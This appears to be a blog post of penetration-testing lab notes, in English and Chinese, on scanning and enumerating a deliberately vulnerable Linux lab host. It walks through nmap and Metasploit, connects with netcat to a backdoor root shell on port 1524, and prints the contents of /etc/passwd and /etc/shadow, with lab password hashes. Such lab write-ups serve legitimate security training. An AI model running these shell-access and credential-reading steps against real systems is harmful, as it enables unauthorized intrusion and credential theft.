---
layout: post
title: "Port Scanning & Enumeration - Linux"
date: "2023-05-10"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Exploitation
---

# Linux Black Box Penetration Test（Linux 黑盒渗透测试）
## Port Scanning & Enumeration - Linux（端口扫描和枚举 - Linux）
# Demo: Port Scanning & Enumeration - Linux（演示：端口扫描和枚举 - Linux）
The first step will involve performing port scanning in order to identify open ports on the target, as well as the services that are running on those open ports. And we can then start performing some basic enumeration to learn as much information as we can about these services and what they are used for in the context of services that might be slightly ambiguous in regards to the function. 

The first step will involve identifying the target IP address, which can be done by catting out the contents of your hosts file, which contains DNS entries or DNS records.

```
cat /etc/hosts
```

10.2.20.22 demo.ine.local

Let's get started with port scanning. You have the ability to output your scan results into the Metasploit Framework.

Perform an Nmap scan. And my objective here is to identify the open ports.

`-sV`: Perform a service version detection scan.

`-p1-10000`: Scan the TCP port range of 1 to 10,000. And you can also increase that to the entire TCP range, which is about 65,535 ports.

`-oN`: Output it into a readable format and then specifying the file name.

```
nmap -sV -p1-10000 10.2.20.22 -oN nmap_10k.txt
```

Telnet was the old the first version of SSH. It had a lot of issues with security, one of which was a lack of encryption of the data that's being transferred between the client and the server. And OpenSSH was developed as a more secure alternative.

We also have a few ambiguous（模糊的） ports here.

Whenever Nmap provides you with the service and then a question mark at the end, that means that it's not sure what this service is and what it's used for.

We would probably need to manually check these ports with Netcat to see what banner they bring up.

Whenever you don't get a service or the banner from a service with Nmap. This is where manual banner grabbing would come into play.

```
nc -nv 10.2.20.22 512

ls
```

```
nc -nv 10.2.20.22 513

ls
```

```
nc -nv 10.2.20.22 514

ls
```

```
nc -nv 10.2.20.22 1524
```

```
root@d1d6a9361621:/# 
```

I've connected to a specific port on the target system with Netcat, and I've received a root shell on the target system.

What this is a bind shell listener. I mentioned how bind shells work. You need to have the listener on the target system, and then the attacker connects to the listener on the target system with Netcat.

Port 1524 is a bind shell listener, and it's provided us with root access on the target system.

```
root@d1d6a9361621:/# ls
```

Get the distribution information.

```
root@d1d6a9361621:/# cat /etc/*release
```

```
root@d1d6a9361621:/# cd /home
root@d1d6a9361621:/home# ls
```

We have WebDAV configured.

```
http://10.2.20.22/dav/
```

# Port Scanning & Enumeration - Linux（端口扫描和枚举 - Linux）
## Overview（概述）
Goal

This lab provides you with a structured guide on how to perform port scanning and enumeration on a Linux target.

The objective is to identify the open ports on the system and identify any potentially interesting services that can be exploited to gain access to the system.

目标

本实验为您提供有关如何在 Linux 目标上执行端口扫描和枚举的结构化指南。

目标是识别系统上的开放端口，并识别任何可被利用来获取系统访问权限的潜在有趣服务。

## 复现视频内容

```
root@attackdefense:~# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.7        attackdefense.com attackdefense
127.0.0.1 AttackDefense-Kali
10.10.21.2      attackdefense.com attackdefense
10.0.16.43    demo.ine.local

```

```
root@attackdefense:~# nmap -sV -p1-10000 10.0.16.43 -oN nmap_10k.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-10 17:33 IST
Stats: 0:02:07 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 95.45% done; ETC: 17:35 (0:00:06 remaining)
Nmap scan report for demo.ine.local (10.0.16.43)
Host is up (0.0032s latency).
Not shown: 9978 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
51/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec?
513/tcp  open  login?
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  ingreslock?
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
6667/tcp open  irc         UnrealIRCd
6697/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)

Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 153.81 seconds
```

```
root@attackdefense:~# nmap -sV -p1-10000 10.0.16.43 -oX nmap_msf_10k.txt
```

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 14 database server: main.
msf6 > db_import nmap_msf_10k.txt
[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.13.0'
[*] Importing host 10.0.16.43
[*] Successfully imported /root/nmap_msf_10k.txt
msf6 > hosts

Hosts
=====

address     mac  name            os_name  os_flavor  os_sp  purpose  info  comments
-------     ---  ----            -------  ---------  -----  -------  ----  --------
10.0.16.43       demo.ine.local  Linux                      server

msf6 > services
Services
========

host        port  proto  name         state  info
----        ----  -----  ----         -----  ----
10.0.16.43  21    tcp    ftp          open   vsftpd 2.3.4
10.0.16.43  22    tcp    ssh          open   OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 Ubuntu Linux; protocol 2.0
10.0.16.43  23    tcp    telnet       open   Linux telnetd
10.0.16.43  25    tcp    smtp         open   Postfix smtpd
10.0.16.43  51    tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0
10.0.16.43  80    tcp    http         open   Apache httpd 2.2.8 (Ubuntu) DAV/2
10.0.16.43  111   tcp    rpcbind      open   2 RPC #100000
10.0.16.43  139   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP
10.0.16.43  445   tcp    netbios-ssn  open   Samba smbd 3.X - 4.X workgroup: WORKGROUP
10.0.16.43  512   tcp    exec         open
10.0.16.43  513   tcp    login        open
10.0.16.43  514   tcp    tcpwrapped   open
10.0.16.43  1099  tcp    java-rmi     open   GNU Classpath grmiregistry
10.0.16.43  1524  tcp    ingreslock   open
10.0.16.43  3306  tcp    mysql        open   MySQL 5.0.51a-3ubuntu5
10.0.16.43  3632  tcp    distccd      open   distccd v1 (GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)
10.0.16.43  5432  tcp    postgresql   open   PostgreSQL DB 8.3.0 - 8.3.7
10.0.16.43  6667  tcp    irc          open   UnrealIRCd
10.0.16.43  6697  tcp    irc          open   UnrealIRCd
10.0.16.43  8009  tcp    ajp13        open   Apache Jserv Protocol v1.3
10.0.16.43  8180  tcp    http         open   Apache Tomcat/Coyote JSP engine 1.1
10.0.16.43  8787  tcp    drb          open   Ruby DRb RMI Ruby 1.8; path /usr/lib/ruby/1.8/drb
```

```
root@attackdefense:~# nc -nv 10.0.16.43 512
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.0.16.43:512.
ls
whoami
^C
root@attackdefense:~# nc -nv 10.0.16.43 513
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.0.16.43:513.
ls
Ncat: Connection reset by peer.
root@attackdefense:~# nc -nv 10.0.16.43 513
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.0.16.43:513.
whoami
Ncat: Connection reset by peer.
root@attackdefense:~# nc -nv 10.0.16.43 514
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.0.16.43:514.
ls
^C
```

```
root@attackdefense:~# nc -nv 10.0.16.43 1524
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.0.16.43:1524.
root@d1d6a9361621:/# whoami
whoami
root
root@d1d6a9361621:/# id 
id
uid=0(root) gid=0(root) groups=0(root)
root@d1d6a9361621:/# pwd
pwd
/
root@d1d6a9361621:/# cat /etc/*release
cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04"
root@d1d6a9361621:/# ls
ls
bin
boot
cdrom
core
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
root@d1d6a9361621:/# cd /home
cd /home
root@d1d6a9361621:/home# ls
ls
ftp
msfadmin
service
user
```

```
root@d1d6a9361621:/home# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
snmp:x:115:65534::/var/lib/snmp:/bin/false
```

```
root@d1d6a9361621:/home# cat /etc/shadow
cat /etc/shadow
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
snmp:*:15480:0:99999:7:::
```

```
http://10.0.16.43/dav/
```

Apache/2.2.8 (Ubuntu) DAV/2 Server at 10.0.16.43 Port 80
